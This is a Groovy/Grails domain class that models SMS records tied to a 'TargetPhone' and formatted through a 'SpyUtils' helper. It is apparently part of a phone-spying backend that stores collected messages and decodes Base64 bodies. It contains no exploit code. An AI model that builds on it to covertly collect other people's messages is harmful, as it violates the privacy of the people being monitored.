package com.atlancy.domain;

import java.text.SimpleDateFormat;

import org.apache.commons.codec.binary.Base64

import sun.misc.BASE64Decoder;

import com.spy.tools.SpyUtils;

public class Sms {

	String id;
	String readState;
	Date time;
	String address;
	String folderName;
	String msg;
	String countryCode;
	String recordState;
	String recordOrigin;

	static belongsTo = [targetPhone:TargetPhone]
	static mapping = {
		version false;
		id generator: 'assigned',type:'string',name:'id';
		msg sqlType:'text(50000) collate utf8mb4_general_ci';
		cache true;
	}

	static constraints = {
		readState nullable :true;
		time nullable :true;
		address nullable :true;
		folderName nullable :true;
		msg nullable :true;
		countryCode nullable :true;
		recordState nullable :true;
		recordOrigin nullable :true;
	}

	public String getFormatedPhoneNumber(){
		return SpyUtils.formatPhoneNumber(this.address);
	}

	public String getFormatedDate(){
		SimpleDateFormat dateFormatHE = new SimpleDateFormat("EEEE d MMMM yyyy ,HH:mm", new Locale("he"));
		return dateFormatHE.format(time);
	}

	public setAddress(String address){
		this.address = SpyUtils.formatPhoneNumber(address);
	}

	public String getDecodedMsg(){
		String result="";
		if(Base64.isBase64(msg)){
			byte[] decodedImage = new BASE64Decoder().decodeBuffer(msg);
			result  = new String(decodedImage);
		}else{
			result = msg;
		}
		
		return result;
	}
}
